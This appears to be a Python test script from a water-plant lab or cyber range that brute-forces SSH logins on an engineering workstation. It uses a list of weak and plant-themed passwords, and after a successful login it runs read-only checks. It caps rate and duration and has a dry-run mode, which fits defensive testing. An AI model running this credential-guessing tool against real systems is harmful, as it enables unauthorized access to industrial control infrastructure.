"""Bounded SSH credential attempts against the lab engineering workstation."""

from __future__ import annotations

import base64
import hashlib
import os
import secrets
import time
from pathlib import Path

from _common import Run, cli, endpoint, parser, passwords, positive, schedule


WRONG_PASSWORDS = (
    "admin",
    "password",
    "password123",
    "12345678",
    "changeme",
    "welcome1",
    "engineer",
    "engineer123",
    "engineering",
    "engineering1",
    "operator",
    "operator123",
    "admin123",
    "admin2026",
    "scada",
    "scada123",
    "plant",
    "plant123",
    "water",
    "waterplant",
    "metropolis",
    "Metropolis1!",
    "Workstation1!",
    "Welcome123!",
)
READ_ONLY_COMMANDS = ("id -un", "uname -s", "pwd")
MAX_RATE = 100.0
MAX_DURATION = 600.0


def password_candidates(
    path: Path | None, known_good: str | None, maximum: int
) -> list[str]:
    if path:
        return passwords(path, known_good or "", maximum)
    if not known_good:
        raise ValueError("Provide --wordlist or configure METROPOLIS_SSH_PASSWORD")
    passwords(None, known_good, maximum)  # Shared 1–1000 attempt validation.
    wrong = [value for value in WRONG_PASSWORDS if value != known_good]
    return wrong[: maximum - 1] + [known_good]


def fixed_command(client, command: str, expected: str | None, timeout: float) -> bool:
    _, stdout, _ = client.exec_command(command, timeout=timeout)
    output = stdout.readline(4096).strip()
    status = stdout.channel.recv_exit_status()
    return status == 0 and (
        output == expected if expected is not None else bool(output)
    )


def main():
    options = parser(__doc__, "MET-ENGINEERING-01")
    options.add_argument("--user", default="engineer")
    options.add_argument("--wordlist", type=Path)
    options.add_argument("--max-attempts", type=int, default=25)
    options.add_argument(
        "--rate", type=positive, help="Maximum login attempts per second (default: 2)"
    )
    options.add_argument(
        "--interval",
        type=positive,
        help="Legacy alternative: minimum seconds between attempts",
    )
    options.add_argument("--duration", type=positive, default=120)
    options.add_argument("--post-login-commands", type=int, choices=range(4), default=3)
    args = options.parse_args()
    if args.rate is not None and args.interval is not None:
        raise ValueError("Use either --rate or --interval")
    rate = args.rate or (1 / args.interval if args.interval else 2.0)
    if rate > MAX_RATE or args.duration > MAX_DURATION:
        raise ValueError(
            f"Rate must be at most {MAX_RATE}/s and duration at most {MAX_DURATION}s"
        )
    device, host, port = endpoint(args, "ssh", "SSH", 22)
    candidates = password_candidates(
        args.wordlist,
        os.getenv("METROPOLIS_SSH_PASSWORD")
        or device.get("environment", {}).get("ENGINEER_PASSWORD"),
        args.max_attempts,
    )
    with Run(
        args,
        "ssh_credentials",
        host=host,
        port=port,
        username=args.user,
        attempts=len(candidates),
        rate=rate,
        duration=args.duration,
        post_login_commands=args.post_login_commands,
    ) as run:
        if args.dry_run:
            return 0
        import paramiko

        fingerprint = None
        attempted = 0
        rejected = 0
        started = time.monotonic()
        for index in schedule(rate, args.duration, len(candidates)):
            password = candidates[index]
            attempted += 1
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(
                    host,
                    port=port,
                    username=args.user,
                    password=password,
                    timeout=args.timeout,
                    auth_timeout=args.timeout,
                    banner_timeout=args.timeout,
                    allow_agent=False,
                    look_for_keys=False,
                )
                key = client.get_transport().get_remote_server_key().asbytes()
                current = "SHA256:" + base64.b64encode(
                    hashlib.sha256(key).digest()
                ).decode().rstrip("=")
                if fingerprint is not None and current != fingerprint:
                    raise RuntimeError("SSH host identity changed during the run")
                fingerprint = current
                token = "metropolis_" + secrets.token_hex(12)
                verified = fixed_command(
                    client, f"printf '%s\\n' '{token}'", token, args.timeout
                )
                commands_verified = 0
                if verified:
                    for command in READ_ONLY_COMMANDS[: args.post_login_commands]:
                        expected = args.user if command == "id -un" else None
                        command_verified = fixed_command(
                            client, command, expected, args.timeout
                        )
                        run.emit("command", command=command, verified=command_verified)
                        if not command_verified:
                            break
                        commands_verified += 1
                run.emit(
                    "attempt",
                    index=index + 1,
                    status="accepted",
                    command_verified=verified,
                    post_login_commands_verified=commands_verified,
                    host_key=current,
                )
                run.emit(
                    "summary",
                    attempted=attempted,
                    rejected=rejected,
                    accepted=True,
                    commands_verified=commands_verified,
                    elapsed_seconds=round(time.monotonic() - started, 3),
                )
                return (
                    0
                    if verified and commands_verified == args.post_login_commands
                    else 1
                )
            except paramiko.AuthenticationException:
                run.emit("attempt", index=index + 1, status="rejected")
                rejected += 1
            except (OSError, paramiko.SSHException) as exc:
                run.emit(
                    "attempt",
                    index=index + 1,
                    status="connection_failed",
                    error=str(exc),
                )
                run.emit(
                    "summary", attempted=attempted, rejected=rejected, accepted=False
                )
                return 2
            finally:
                client.close()
        run.emit(
            "summary",
            attempted=attempted,
            rejected=rejected,
            accepted=False,
            elapsed_seconds=round(time.monotonic() - started, 3),
        )
        return 1


if __name__ == "__main__":
    raise SystemExit(cli(main))
